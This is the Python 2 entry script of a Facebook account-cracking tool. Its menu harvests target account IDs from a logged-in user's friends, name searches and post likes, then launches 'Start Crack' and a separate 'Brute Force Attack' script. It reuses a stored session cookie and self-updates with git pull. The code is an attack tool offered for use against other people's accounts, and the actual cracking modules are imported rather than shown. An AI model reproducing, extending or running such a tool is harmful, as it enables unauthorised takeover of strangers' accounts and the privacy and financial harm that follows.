#!usr/bin/python2.7
# coding=utf-8
#The Credit For This Code Goes To Rana Aahil
#If You Wanna Take Credits For This Code, Please Look Yourself Again...
#Reserved2020

import os, time
from app import config
from app import login
from app import crack
from src import friends_list
from src import friends
from src import search_name
from src import likes
from bs4 import BeautifulSoup as parser
import time
import sys
import random



def jalan(s):
    for c in s + '\n':
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(random.random() * 0.05)

class Brute(object):
	def __init__(self, url):
		self.url = url
		self.config = config.Config()
		self.cookie = self.config.loadCookie()
		self.menu = '\n'
		self.menu += ('  [ \033[0;96m1\033[1;91m ]  \033[1;91mStart Crack\n')
		self.menu += ('  [ \033[0;96m2\033[1;91m ]  \033[1;91mDM Id Friends\n')
		self.menu += ('  [ \033[0;96m3\033[1;91m ]  \033[1;91mDM Id by Search name\n')
		self.menu += ('  [ \033[0;96m4\033[1;91m ]  \033[1;91mDM Id from likes status\n')
                self.menu += ('  \033[0m[ \033[1;96m5\033[0m ]  \033[0mDM id Friends lists\n')
		self.menu += ('  [ \033[0;96m6\033[0m ]  \033[0mBrute Force Attack\n')
                self.menu += ('  [ \033[1;96m7\033[0m ]  \033[0mUpdate Script?\n')
		self.menu += ('  [ \033[0;96m0\033[0m ]  \033[0mRemove cookies\n')
		if self.cookie == False:
			login.loginFb(self, self.url, self.config)
			self.cookie = self.config.loadCookie()

	def start(self):
		response = self.config.httpRequest(self.url+'/profile.php', self.cookie).encode('utf-8')
		if 'mbasic_logout_button' in str(response):
			self.main(response)
		else:
			os.remove('log/cookies.log')
			print('\n\033[0;91m[WARNING] Cookies invalids, please login again.\033[0m')
			raw_input('\n[ Press Enter]')
			login.loginFb(self, self.url, self.config)
			self.cookie = self.config.loadCookie()
			self.start()
			exit()

	def main(self, response):
		os.system('clear')
		print(self.config.banner())
		html = parser(response, 'html.parser')
		jalan('\033[1;91m      ________________________________________________________')
		jalan('\t\t\n\033[1;94m                  (\033[0;96m•\033[1;94m)  BY: Zero & Sumarr ID  \033[1;94m(\033[0;96m•\033[1;94m)')
		jalan('\033[1;91m      ________________________________________________________')
		print(self.menu)
		try:
			choose = int(raw_input('\033[1;94m Selaa>===>># '))
		except ValueError:
			exit('\n\033[0;91mYou Crazy.\033[0m')
		if choose == 1:
			exit(crack.Brute().main())
		elif choose == 2:
			exit(friends.main(self, self.cookie, self.url, self.config))
		elif choose == 3:
			exit(search_name.main(self, self.cookie, self.url, self.config))
		elif choose == 4:
			exit(likes.main(self, self.cookie, self.url, self.config))
                elif choose == 5:
                        exit(friends_list.main(self, self.cookie, self.url, self.config))
		elif choose == 6:
                        os.system('cd brute && python2 brute.VNM')
                elif choose == 7:
                        os.system('clear')
                        jalan('\033[1;94mPlease Wait !')
		        os.system('git pull origin master')
		        raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
		        exit()
		elif choose == 0:
			ask = raw_input('\nAre you Sure? [y/N]:\033[1;91m ')
			if ask.lower() == 'y':
				jalan('\nRemoving cookies...')
				time.sleep(2)
				os.remove('log/cookies.log')
				jalan('\n\033[1;92mSuccess removed!\033[0m')
				time.sleep(2)
				login.loginFb(self, self.url, self.config)
				self.cookie = self.config.loadCookie()
				self.start()
			else:
				self.cookie = self.config.loadCookie()
				print('\ncanceled!')
				self.start()
		else: exit('\n\033[0;91mYou crazy.\033[0m')
